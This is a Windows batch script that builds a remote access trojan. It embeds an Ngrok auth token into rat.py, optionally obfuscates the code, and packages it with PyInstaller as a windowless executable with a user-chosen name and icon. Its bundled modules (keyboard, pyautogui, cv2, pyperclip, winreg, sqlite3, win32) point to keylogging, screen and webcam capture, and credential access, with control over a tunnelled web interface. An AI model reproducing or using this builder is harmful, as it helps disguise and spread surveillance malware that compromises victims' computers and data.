@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

title Builder - Ngrok Token

where python >nul 2>&1
if errorlevel 1 (
    echo ❌ Python is not installed or not found in PATH.
    echo Please install Python from https://python.org and add it to PATH, or run this script from a console where Python is available.
    pause
    exit /b 1
)

python -c "import sys; print('Using Python:', sys.executable); print('Version:', sys.version.splitlines()[0])"
echo.

set /p "NGROK_TOKEN=Enter your Ngrok auth token: "
if "!NGROK_TOKEN!"=="" (
    echo No token provided.
    pause
    exit /b 1
)

set /p "EXE_NAME=Enter the name for your executable (without .exe): "
if "!EXE_NAME!"=="" set "EXE_NAME=WebControl"

set "ICON_OPTION="
set /p "USE_ICON=Do you want to use a custom .ico file? (y/n): "
if /i "!USE_ICON!"=="y" (
    set /p "ICON_PATH=Enter path to the .ico file: "
    if exist "!ICON_PATH!" (
        set "ICON_OPTION=--icon=!ICON_PATH!"
    ) else (
        echo Icon file not found, continuing without icon.
        set "ICON_OPTION="
    )
)

echo Creating modified file with Ngrok token...

if not exist "rat.py" (
    echo Cannot find rat.py in current folder. Place your source rat.py next to this builder.
    pause
    exit /b 1
)

echo Creating modified Python file with Ngrok token...

rem Crear archivo Python temporal para procesar el token
echo import sys > temp_process.py
echo. >> temp_process.py
echo with open('rat.py', 'r', encoding='utf-8') as f: >> temp_process.py
echo     content = f.read() >> temp_process.py
echo. >> temp_process.py
echo ngrok_token = sys.argv[1] >> temp_process.py
echo. >> temp_process.py
echo # Buscar la variable auth_token y reemplazarla >> temp_process.py
echo if 'auth_token = None' in content: >> temp_process.py
echo     new_content = content.replace('auth_token = None', 'auth_token = \"' + ngrok_token + '\"') >> temp_process.py
echo else: >> temp_process.py
echo     # Si no existe, agregarla al inicio después de los imports >> temp_process.py
echo     lines = content.split('\n') >> temp_process.py
echo     new_lines = [] >> temp_process.py
echo     imports_done = False >> temp_process.py
echo     for line in lines: >> temp_process.py
echo         new_lines.append(line) >> temp_process.py
echo         if not imports_done and (line.startswith('import ') or line.startswith('from ')): >> temp_process.py
echo             continue >> temp_process.py
echo         elif not imports_done and line.strip() == '': >> temp_process.py
echo             continue >> temp_process.py
echo         else: >> temp_process.py
echo             if not imports_done: >> temp_process.py
echo                 new_lines.append('') >> temp_process.py
echo                 new_lines.append('# Ngrok authentication token') >> temp_process.py
echo                 new_lines.append('auth_token = \"' + ngrok_token + '\"') >> temp_process.py
echo                 new_lines.append('') >> temp_process.py
echo                 imports_done = True >> temp_process.py
echo. >> temp_process.py
echo     if not imports_done: >> temp_process.py
echo         # Si no hay imports, agregar al inicio >> temp_process.py
echo         new_lines.insert(0, '# Ngrok authentication token') >> temp_process.py
echo         new_lines.insert(1, 'auth_token = \"' + ngrok_token + '\"') >> temp_process.py
echo         new_lines.insert(2, '') >> temp_process.py
echo. >> temp_process.py
echo     new_content = '\n'.join(new_lines) >> temp_process.py
echo. >> temp_process.py
echo with open('modified_rat.py', 'w', encoding='utf-8') as f: >> temp_process.py
echo     f.write(new_content) >> temp_process.py
echo. >> temp_process.py
echo print('Successfully created modified_rat.py with Ngrok token') >> temp_process.py

python temp_process.py "!NGROK_TOKEN!"

if errorlevel 1 (
    echo Failed to create modified file.
    call :cleanup
    pause
    exit /b 1
)

del temp_process.py

set "AS_SOURCE=modified_rat"
set /p "USE_OBF=Do you want to obfuscate? (y/n): "
if /i "!USE_OBF!"=="y" (
    if exist obf.py (
        echo Running obfuscator...
        python obf.py
        if errorlevel 1 (
            echo Obfuscation failed.
            call :cleanup
            pause
            exit /b 1
        )
        if exist obfuscated_rat.py (
            set "AS_SOURCE=obfuscated_rat"
        ) else (
            echo obfuscated_rat.py not present after obf.py; falling back to modified_rat.py
            set "AS_SOURCE=modified_rat"
        )
    ) else (
        echo obf.py not found; skipping obfuscation.
    )
)

if not exist ".venv\Scripts\activate.bat" (
    echo Creating virtual environment...
    python -m venv .venv
    if errorlevel 1 (
        echo Failed to create virtualenv.
        call :cleanup
        pause
        exit /b 1
    )
)

call .venv\Scripts\activate.bat

echo Upgrading pip...
python -m pip install --upgrade pip setuptools wheel >nul 2>&1

if exist requirements.txt (
    echo Installing requirements from requirements.txt...
    python -m pip install -r requirements.txt
) else (
    echo No requirements.txt found; continuing.
)

echo Installing PyInstaller...
python -m pip install --upgrade pyinstaller >nul 2>&1

echo Checking for SQLite support...
python -c "import sys, os; exec('try:\n import _sqlite3\n with open(\"sqlite_path.tmp\", \"w\") as f: f.write(os.path.abspath(_sqlite3.__file__))\n print(\"SQLite support found\")\nexcept:\n print(\"SQLite support not found or built-in\")')" 2>nul

set "SQLITE_PYD="
if exist sqlite_path.tmp (
    set /p SQLITE_PYD=<sqlite_path.tmp
    del sqlite_path.tmp
    echo Found _sqlite3 at: !SQLITE_PYD!
)

set "HIDDEN_ARGS=--hidden-import=asyncio --hidden-import=base64 --hidden-import=ctypes --hidden-import=time --hidden-import=glob --hidden-import=io --hidden-import=json --hidden-import=logging --hidden-import=os --hidden-import=pathlib --hidden-import=platform --hidden-import=re --hidden-import=shutil --hidden-import=socket --hidden-import=sqlite3 --hidden-import=pygame --hidden-import=ssl --hidden-import=subprocess --hidden-import=sys --hidden-import=tempfile --hidden-import=threading --hidden-import=urllib.request --hidden-import=webbrowser --hidden-import=winreg --hidden-import=zipfile --hidden-import=datetime --hidden-import=urllib3 --hidden-import=aiohttp --hidden-import=certifi --hidden-import=cv2 --hidden-import=keyboard --hidden-import=numpy --hidden-import=pyautogui --hidden-import=pyperclip --hidden-import=requests --hidden-import=moviepy --hidden-import=cryptography --hidden-import=cryptography.hazmat.primitives.ciphers.aead --hidden-import=flask --hidden-import=PIL --hidden-import=werkzeug.serving --hidden-import=pycaw.pycaw --hidden-import=comtypes --hidden-import=pythoncom --hidden-import=win32api --hidden-import=win32con --hidden-import=win32gui"


echo Building executable with PyInstaller...
echo.

set "PYINST_CMD=python -m PyInstaller "!AS_SOURCE!.py" --onefile --windowed --name "!EXE_NAME!" !HIDDEN_ARGS!"

if not "!ICON_OPTION!"=="" (
    set "PYINST_CMD=!PYINST_CMD! !ICON_OPTION!"
)

if not "!SQLITE_PYD!"=="" (
    set "PYINST_CMD=!PYINST_CMD! --add-binary=!SQLITE_PYD!:."
)

echo Command: !PYINST_CMD!
echo.

!PYINST_CMD!
if errorlevel 1 (
    echo PyInstaller build failed.
    call :cleanup
    pause
    exit /b 1
)

echo.
echo ================================
echo    BUILD COMPLETE!
echo ================================
echo.
echo ✅ Executable created: dist\!EXE_NAME!.exe
echo.
echo 📝 Ngrok token has been embedded in the executable
echo 🌐 The application will use web interface instead of Discord
echo.

if exist "dist\!EXE_NAME!.exe" (
    echo Opening executable location...
    explorer "dist"
) else (
    echo Warning: Executable not found at expected location.
)

call :cleanup
call deactivate 2>nul
pause
endlocal
exit /b 0

:cleanup
if exist modified_rat.py del modified_rat.py 2>nul
if exist obfuscated_rat.py del obfuscated_rat.py 2>nul
if exist sqlite_path.tmp del sqlite_path.tmp 2>nul
if exist temp_process.py del temp_process.py 2>nul
exit /b 0
